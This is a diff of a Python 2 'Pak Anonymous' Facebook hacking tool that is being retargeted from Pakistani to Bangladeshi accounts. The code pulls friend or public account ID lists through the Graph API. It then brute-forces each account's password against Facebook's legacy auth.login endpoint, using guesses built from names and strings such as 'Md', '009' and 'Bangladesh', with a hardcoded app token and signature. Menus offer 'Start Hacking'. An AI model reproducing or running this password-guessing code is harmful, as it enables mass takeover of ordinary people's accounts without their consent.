@@ -51,15 +51,14 @@ def jalan(z):
 #Dev:Babar_Ali
 ##### LOGO #####
 logo = """
-\033[1;93m|-------+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-----|
-\033[1;93m|               Pak Anonymous               |
-\033[1;93m|This Tool is Only for Pakistani FB Accounts|
-\033[1;93m|------+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+------|
+\033[1;96m|-------+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-----|
+\033[1;96m|               Pak Anonymous               |
+\033[1;96m|This Tool is Only for Bangladesh FB Acounts|
+\033[1;96m|------+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+------|
 
-\033[1;97m [💥\033[1;97mAuthor Name: Babar Ali     💥\033[1;97m]
-\033[1;97m [💥\033[1;97mPhone Numbr: +923000223253 💥\033[1;97m]
-\033[1;97m [💥\033[1;97mYutube Chnl: Pak Anonymous 💥\033[1;97m]
-\033[1;97m [💥       \033[1;97mFrom: Pakistan      💥\033[1;97m]
+\033[1;91m [⚡\033[1;97mAuthor Name: Babar Ali     ⚡\033[1;97m]
+\033[1;91m [⚡\033[1;97mYutube Chnl: Pak Anonymous ⚡\033[1;91m]
+\033[1;91m [⚡       \033[1;97mFrom: Pakistan      ⚡\033[1;91m]
 """
 
 def tik():
@@ -121,10 +120,6 @@ def login():
 	print logo
 	print "\033[1;91m[1]\x1b[1;95mLogin With Facebook Account  "
         time.sleep(0.05)
-        print "\033[1;91m[2]\x1b[1;95mLogin  With Token"
-        time.sleep(0.05)
-        print "\033[1;91m[3]\x1b[1;95mDownload Token App"
-        time.sleep(0.05)
 	print "\033[1;91m[0]\033[1;94mExit             "
 	pilih_login()
 
@@ -135,11 +130,6 @@ def pilih_login():
 		pilih_login()
 	elif peak =="1":
 		login1()
-        elif peak =="2":
-	        token()
-        elif peak =="3":
-	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
-	        login()
 	elif peak =="0":
 		keluar()
         else:
@@ -155,12 +145,12 @@ def login1():
 		os.system('clear')
                 time.sleep(0.05)
 		print logo
-		jalan(' \033[1;91mWarning:\033[1;92m Do Not Use Your Personal Account' )
-		jalan(' \033[1;91mWarning:\033[1;92m Use a New Account To Login' )
-		jalan(' \033[1;91mWarning: \033[1;92mTermux All Version Work ' )
-		jalan(' \033[1;91mWarning: \033[1;92mYour Internet Should Be Fast ' )
+		jalan(' \033[1;92mWarning:\033[1;91m Do Not Use Your Personal Account' )
+		jalan(' \033[1;92mWarning:\033[1;91m Use a New Account To Login' )
+		jalan(' \033[1;92mWarning: \033[1;91mTermux All Version Work ' )
+		jalan(' \033[1;92mWarning: \033[1;91mYour Internet Should Be Fast ' )
 		
-		print('\033[1;97m\x1b[1;93m▩━━━━━━━Login Your Facebook Account━━━━━━━━▩\x1b[1;97m' )
+		print('\033[1;97m\x1b[1;93m▩━━━━━━━━━Login Your Facebook Account━━━━━━━━━━▩\x1b[1;97m' )
 		print('	' )
 		id = raw_input('\033[1;97m[*] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
 		pwd = raw_input('\033[1;97m[*] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;92m')
@@ -240,11 +230,9 @@ def menu():
 	print "  \033[1;92m\033[1;93m💫💫Logged in User Info\033[1;92m💫💫"
 	print "	   \033[1;91m Name\033[1;93m:\033[1;91m"+nama+"\033[1;93m               "
 	print "	   \033[1;91m ID\033[1;93m:\033[1;91m"+id+"\x1b[1;93m              "
-	print "\033[1;97m[1]\x1b[1;93mStart Hacking"
-	print "\033[1;97m[2]\x1b[1;93mID Not Found Problem"
-	print "\033[1;97m[3]\x1b[1;93mJoin Pak Anonymous Whatsapp Group"
-	print "\033[1;97m[4]\x1b[1;93mContact With Pak Anonymous Owner On Facebook"
-	print "\033[1;97m[5]\x1b[1;93mSubscribe Pak Anonymous Youtube Channel " 
+	print "\033[1;97m[1]\x1b[1;92mStart Hacking"
+	print "\033[1;97m[2]\x1b[1;92mID Not Found Problem"
+	print "\033[1;97m[3]\x1b[1;92mSubscribe Pak Anonymous Youtube Channel " 
 	print "\033[1;97m[0]\033[1;93mExit            "
 	pilih()
 
@@ -260,12 +248,6 @@ def pilih():
 		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
 	        menu()
 	elif unikers =="3":
-		os.system('xdg-open https://chat.whatsapp.com/FlzjJ1wklTo3EvKtkSfwRZ')
-	        menu()
-        elif unikers =="4":
-		os.system('xdg-open https://facebook.com/Babar.ali7500')
-	        menu()
-	elif unikers =="5":
 		os.system('xdg-open https://m.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
 	        menu()		
 	elif unikers =="0":
@@ -285,13 +267,7 @@ def pilih():
 	elif unikers =="2":
 		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
 	        menu()
-        elif unikers =="3":
-		os.system('xdg-open https://chat.whatsapp.com/FlzjJ1wklTo3EvKtkSfwRZ')
-	        menu()
-        elif unikers =="4":
-		os.system('xdg-open https://facebook.com/Babar.ali7500')
-	        menu()
-	elif unikers =="5":
+	elif unikers =="3":
 		os.system('xdg-open https://m.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
                 menu()
 	elif unikers =="0":
@@ -315,13 +291,13 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m[1]\x1b[1;93mHack From Friend List"
-	print "\033[1;97m[2]\x1b[1;93mHack From Public Accounts"
+	print "\033[1;97m[1]\x1b[1;34mHack From Friend List"
+	print "\033[1;97m[2]\x1b[1;34mHack From Public Accounts"
 	print "\033[1;97m[0]\033[1;95mBack"
 	pilih_super()
 
 def pilih_super():
-	peak = raw_input("\n\033[1;94mChoose an Option: \033[1;97m")
+	peak = raw_input("\n\033[1;35mChoose an Option: \033[1;97m")
 	if peak =="":
 		print "\x1b[1;91mFill in correctly"
 		pilih_super()
@@ -329,7 +305,7 @@ def pilih_super():
 		os.system('clear')
 		print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHuntter\033[1;95m-_-_-_-_-_-_-_-_-»"
 		print logo
-		jalan('\033[1;93mGetting Accounts \033[1;93m...')
+		jalan('\033[1;91mGetting Accounts \033[1;93m■■■■■100%')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -338,16 +314,16 @@ def pilih_super():
 		os.system('clear')
 		print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHunttet\033[1;95m-_-_-_-_-_-_-_-_-»"
 		print logo
-		idt = raw_input("\033[1;96m[*] \033[1;92mEnter ID\033[1;93m: \033[1;97m")
+		idt = raw_input("\033[1;96m[*] \033[1;96mEnter ID\033[1;93m: \033[1;97m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
 			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
 		except KeyError:
-			print"\x1b[1;92mID Not Found!"
+			print"\x1b[1;91mID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		print"\033[1;93mGetting Accounts\033[1;93m■■■■■100%"
+		print"\033[1;91mGetting Accounts\033[1;93m■■■■■100%"
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -443,7 +419,7 @@ def pilih_super():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = b['first_name'] + 'khan'											
+						           pass4 = b['first_name'] + 'Md'											
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -487,7 +463,7 @@ def pilih_super():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = 'Pakistan'											
+							                           pass6 = 'Bangladesh'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
@@ -553,7 +529,7 @@ def pilih_super():
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass8)   	
 										                                   else:					
-										                                       pass9 = b['first_name'] + '786'					
+										                                       pass9 = b['last_name'] + '009'					
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
 										                                       q = json.load(data)				
 										                                       if 'access_token' in q:		
